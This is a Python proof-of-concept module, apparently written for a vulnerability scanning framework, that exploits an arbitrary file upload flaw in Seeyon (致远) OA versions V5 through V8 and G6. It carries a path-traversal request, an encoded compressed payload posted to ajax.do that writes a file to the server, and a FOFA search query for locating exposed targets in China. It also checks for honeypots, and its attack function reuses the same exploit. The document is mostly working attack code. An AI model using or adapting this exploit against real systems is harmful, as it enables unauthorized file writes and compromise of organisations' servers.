# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()
import json
class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "致远OA ajax.do 任意文件上传",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "致远OA",                     # 漏洞应用名称
        "AppVersion" : """
            致远OA V8.0
            致远OA V7.1、V7.1SP1
            致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3
            致远OA V6.0、V6.1SP1、V6.1SP2
            致远OA V5.x
            致远OA G6
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            致远OA部分版本存在前台文件上传  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="致远" && country="CN"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/seeyon/autoinstall.do/..;/ajax.do" # url自己按需调整
        url1 = self.target + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
        data1 = "managerMethod=validate&arguments=%1F%C2%8B%08%00%20%C3%BECa%00%C3%BFu%C2%91%5FO%C3%820%10%C3%80%C3%9F%C3%BD%14%C3%8D%5E%3A%22%16%C3%BF%C3%85%C2%A8%C2%84%07%C2%88%C3%B0%C2%A8FP%C3%BC%13%1F%C3%AAvs%C3%83%C2%ADm%C3%96%C2%9B%14%09%C3%9F%C2%9D%C2%96%C3%96%40%22%C3%AE%C3%A5z%C3%97%C2%BB%C3%9F%7E%C3%9B%C2%BD%2Di%26%C3%AB%C2%AA%29%C3%B9d%C2%A1%C2%80%5E%C2%93%C2%936%C3%B9%C2%AD%C3%9C%C3%B2%C3%8AU%28%C2%82F%C2%BA%2D%0F%C2%8D%C2%AAA%C3%ABB%0Aw9%C3%86%C2%BA%10%C2%9FDq%C3%8CI%C2%8FD%C2%8Cu%C3%A6%C3%B0%C3%81%C2%95%C3%92%1D%0D%C2%B0%C2%90%C2%A2%13u%0FHxf%C3%BC%C2%9B%C2%B3B%C2%B2%7B%3B%C2%82%C3%93%C2%BA%40%C2%A8%C2%89%C3%9A%C2%9EO%2D%40%C3%80%7C%5F%5B%C3%AC%C3%B8%C2%87%11%C2%9F%C3%B1%3B%C2%93%C2%8E%24%C3%82%C2%B3F%C2%86%06%C2%A3%C3%96%C2%96%1ELt%0Ee%C3%A9T%5E%C2%A6%2A%C2%9F%C2%9C%C3%A5%5F%0F%C3%95%C3%95%C3%B1%C3%ABS%C3%BE%C2%93%C3%B6%7B%C2%BD%1D%19%C3%9D%08V%15%3Aa%C2%83%C3%BExxq%7E%03%C2%89L%C2%ADO%1A%C2%A2W%C3%99%C3%9F%14%C3%BF%7D%C2%AB%1F%0B%C2%89%C2%9F%C3%B5I%1C%C2%80%C3%8C%C3%87A%C2%93e%16%C2%B0%C2%91l%C2%B5%C2%A3%C3%87%C3%89%C3%A8%C3%A8r%C3%B7%23v%7F%07%C3%9B%24%C2%A5%08%08%C3%8F%C3%BB%C2%AF7%29%C2%A5%06%2B%C2%B6%C3%AA%C2%BAu%C3%99C%0A%19%C3%91%C3%88%C2%B1H%C2%881%26n%2D%C3%A9%C3%8A%C3%AE%C3%90%C3%AEq%C3%A9%22%C3%96%0D%C3%90%C3%B75%C3%9F%C3%95%1C3%C3%BE%01%00%00"
        url2 = self.target + "/seeyon/ajaOxdFoteXst.txt"
        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "java.lang.NullPointerException:null" in req0.text:#req.status_code == 200 and :
                req1 = requests.post(url1,data = data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 500 and json.loads(req1.text)["code"] != "-1":
                    req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if "ajaOxdFoteXst" in req2.text and req2.status_code == 200:
                        vuln = [True,req2.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()